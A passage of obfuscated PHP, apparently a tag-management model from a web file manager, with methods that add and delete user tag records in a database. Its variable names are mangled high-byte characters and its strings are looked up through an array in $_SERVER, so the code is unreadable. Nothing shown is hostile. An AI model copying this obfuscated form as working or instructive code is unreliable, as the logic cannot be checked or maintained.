$»Ï»ùá : array(); } protected function addToTag($ıó©ßÈÂ, $÷ªÉ·Ş) { $óä¨êü =& $_SERVER[±Ö‰ô½¯]; if (!Model($óä¨êü[2405])->listData($÷ªÉ·Ş)) { return !1; } if (is_numeric($ıó©ßÈÂ)) { $òßÑ€ò¾ = Model($óä¨êü[930])->pathInfo($ıó©ßÈÂ); if (!$òßÑ€ò¾) { return !1; } } else { $òßÑ€ò¾ = IO::infoSimple($ıó©ßÈÂ); if (!$òßÑ€ò¾) { return !1; } $è‹…‹ô† = $òßÑ€ò¾[$óä¨êü[32]]; $«£ù¸Ğ™ = $òßÑ€ò¾[$óä¨êü[33]]; if (isset($òßÑ€ò¾[$óä¨êü[497]])) { $«£ù¸Ğ™ = $òßÑ€ò¾[$óä¨êü[497]] == $óä¨êü[91] ? $óä¨êü[78] : $óä¨êü[232]; } } $å££ù÷™ = array($óä¨êü[1921] => USER_ID, $óä¨êü[570] => $÷ªÉ·Ş, $óä¨êü[507] => $ıó©ßÈÂ, $óä¨êü[508] => $«£ù¸Ğ™ ? $«£ù¸Ğ™ : $óä¨êü[502], $óä¨êü[506] => $è‹…‹ô† ? $è‹…‹ô† : $óä¨êü[12], $óä¨êü[2140] => 0); if ($this->where($å££ù÷™)->find()) { return !1; } return $this->add($å££ù÷™); } protected function removeFromTag($ªû²Õ®, $Öâ†È‘Ü) { $•¢Ü“á =& $_SERVER[±Ö‰ô½¯]; if (!Model($•¢Ü“á[2405])->listData($Öâ†È‘Ü)) { return !1; } if (is_array($ªû²Õ®)) { $ªû²Õ® = array($•¢Ü“á[7], $ªû²Õ®); } $àòè¯© = array($•¢Ü“á[1921] => USER_ID, $•¢Ü“á[570] => $Öâ†È‘Ü, $•¢Ü“á[507] => $ªû²Õ®); return $this->where($àòè¯©)->delete(); } protected function removeByTag($ñ™¾­í‹) { $À¹ÍÍæ¸ =& $_SERVER[±Ö‰ô½¯]; if (!$ñ™¾­í‹) { return !1; } $“¸ÕßÚ¦ = array($À¹ÍÍæ¸[1921] => USER_ID, $À¹ÍÍæ¸[570] => $ñ™¾­í‹); return $this->where($“¸ÕßÚ¦)->delete(); } protected function removeBySource($”…º„ğ) { $Óûäá‘ =& $_SERVER[±Ö‰ô½¯]; if (is_array($”…º„ğ)) { $”…º„ğ = array($Óûäá‘[7], $”…º„ğ); } $ŠÚôŞçª = array($Óûäá‘[1921] => USER_ID, $Óûäá‘[570] => array($Óûäá‘[1130], 0), $Óûäá‘[507] => $”…º„ğ); return $this->where($ŠÚôŞçª)->delete(); } }